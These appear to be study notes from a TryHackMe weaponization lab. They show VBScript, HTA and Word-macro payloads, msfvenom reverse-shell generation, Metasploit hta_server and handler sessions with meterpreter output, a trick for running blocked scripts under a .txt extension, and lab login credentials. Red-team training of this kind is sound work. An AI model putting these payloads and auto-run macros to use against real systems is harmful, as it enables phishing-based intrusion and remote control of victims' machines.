Task 1 - Introduction
-----------------------------------

Here we go over some techniques for weaponization.


### What is Weaponization

This is the 2nd stage in the Cuber Kill Chain model.  This is where the attacker generates malicious code using deliverable payloads like PDF or Word documents, etc. This stage aims to use this weapon to target a machine and gain initial access.

Almost every company uses Windows in some form.  Nowdays most vectors are blocked. Such as just simply sending an .exe file, so we need to be more creative and use obfuscated and custom payloads send in various methods like phishing campaigns, social engineering, exploits, usb or web methods.

The following is an example where a custom PDF or .doc file is used to deliver a malicious payload. Then the payload will connect back to the C2 framework in our Red Team Infrastructure.

![[weaponization-1.png]]

For more information about red team toolkits, please visit the following: a [GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development) that has it all, including initial access, payload development, delivery methods, and others.

Since many common vectors are blocked, we will focus on some LoTL (Living off the Land) technics using internal scripting like:

-   The Windows Script Host (WSH)
-   An HTML Application (HTA)
-   Visual Basic Applications (VBA)
-   PowerShell (PSH)

__Questions__

Let's deploy the target machine in the next task, and we'll get started with the Windows Script Host technique in the subsequent task!
Answer: _None Needed_

Task 2 - Deploy the Windows Machine
---------------------------------------------------------------

Deploy the machine and connect.

```bash
user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
```

The username: thm  and the password: TryHackM3

__Questions__
Deploy the attached Windows machine and connect to it via the RDP client. Once this is done, move to the next task.
Answer: _None Needed_

Task 3 - Windows Scripting Host (WSH)
----------------------------------------------------------------

Windows Scripting Host (WSH) is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript).  Since the engine runs with the same perms as the user it is useful for Red Teamers.

Put the following into a file called `hello.vbs`


```javascript
Dim message 
message = "Welcome to THM"
MsgBox message
```

Then we run it with wscript and get:

![[weaponization-2.png]]

Now let's use this way to run an executable file:

```javascript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

Again, we run it with wscript:

```shell-session
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

or with cscript:


```shell-session
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```

We got the calculator app to open on the desktop:

![[weaponization-3.png]]

Sometimes admins will blacklist .vbs script file extentions from running, but we can also execute them just by renaming them using a .txt extention.

```shell-session
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

The result is the same, and calc will run.

__Questions__

Try to replace the calc.exe binary to execute cmd.exe within the Windows machine.
Answer: _None Needed_


Task 4 - An HTML Application (HTA)
----------------------------------------------------------

HTA stands for "HTML Application". These are dynamic HTML pages containing JScript and VBScript. One of the tools we can use to run these is `mshta`. This is one of the standard tools and what we refer to as one of the Living-Off-The-Land (LOLBINS) Binaries. It can be manually run or triggered to run automatically from Internet Edge/Exlorer.

In this example, we use an ActiveXObject in our payload to execute `cmd.exe`.

```javascript
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then we could serve this payload from our attackbox like this:

```bash
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

Now, on the victim machine, visit the malicious link using Microsoft Edge Browser:
`http://ATTACKBOX_IP:8090/payload.hta`

![[HTA-1.png]]

After pressing run the `payload.hta` gets executed and will invoke `cmd.exe`.

![[HTA-2.png]]

**HTA Reverse Connection**

We can do a reverse shell payload as follows:

```bash
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

Here we used msfvenom to create a malicious payload to connect back to the attack box.

On the Attack box we just need to run the following to catch the reverse shell:

```bash
sudo  nc -lvp 443
```

Here is what we can once the connection is made:

```bash
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

### Malicious HTA via Metasploit

We can also use the Metasploit framework to generate these types of HTA payloads.

First run:
`msfconsole -q`  

We can use the following exploit:
`exploit/windows/misc/hta_server`

We then just need to complete the options:
**LHOST, LPORT, SRVHOST, Payload**

Then run the `execute` command as shown:

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

As we see, Metaploit generates the URL we can use to provide our victim.
http://10.8.232.37:8080/TkWV9zkd.hta

Once the victim opens this URL in a browser we should get a reverse connection back.

```bash
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```

__Questions__
Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.
Answer: _None Needed_


Task 5 - Visual Basic for Application - VBA
--------------------------------------------------------------------

### Visual Basic for Application (VBA)

Visual Basic for Applications is a programming language by Microsoft implemented for applications such as Word, Excel and PowerPoint. This allows automating tasks of almost all keyboard/mouse interactions between the user and these MS Office applications.

Macros are these Office Applications that have embedded code from VBA. One feature of VBA is to access the Windows Application Programming Interface.

In this tasks we will explore using VBA to create malicious payloads in the form of MS Word documents.

After opening Microsoft Word, we can create a blank document and create our first macro. Once you have a doc opened, then open the Visual Basic Editor by selecting **View** -> **macros**.  This brings up the macros window:

![[vbamacros-1.png]]

Put the name **THM**, and select the dropdown box below **Macros in:** and select **Document1 (document)** from the dropdown, then we can click **Create**

Next in the resulting editor let's try adding the following code to display a messagebox:

```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Next we can run the macro by using the **F5** key or by using the **Run** -> **Run Sub/UserForm** interface.

Great! Now in order to get this to execute automatically when a user opens the document, we can use the built-in functions such as **AutoOpen** and **Document_open**. Note that we need to specify the document function name we named the macro. In our case THM.

```vbscript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as **.doc** and **docm**. 

Now let's save the file as **Word 97-2003 Template** where the Macro is enabled by going to **File** → **save Document1** and save as **type** → **Word 97-2003 Document** and finally, **save**.

![[vbamacros-2.png]]

Now close the Word Document and reopen it. We should get a security warning that **Macros have been disabled**, but there is an option for us to enable it. 

![[vbamacros-3.png]]

Once we enable the content our macro is shown:

![[vbamacros-4.png]]

Now edit the word document again and create a macro function that open the calculator (calc.exe) or any .exe file as a PoC.

```vbscript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

You can test it using the options mentioned before.  Make sure you do the **AutoOpen()** and **Document_open()** functions and they contain the name of the macro before you save. 


![[vbamacros-5.png]]


We can combine these methods with other LOLBINS like HTAs.

__Questions__

Lets make an in-memory Meterpreter payload to receive a shell. Create the payload from the Attackbox using msfvenom:

```bash
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```

Just make sure to set the proper LHOST. Either the tun0 of your own VM connected to VPN or the AttackBox IP.

NOTE: We need to change **Workbook_Open()** to **Document_Open()** to make it suitable for MS word docs.

Now copy the output we get and paste it into the macro editor as we did befoe.

From the attackbox, run the Metasploit framework and set the listener:

```bash
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
```

Now when the malicious doc is opened on the victim's machine, we should get a reverse shell.

```bash
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```

Now replicate and apply what we discussed to get a reverse shell!
Answer: _None Needed_




Task 6 - PowerShell - PSH
-------------------------------------------

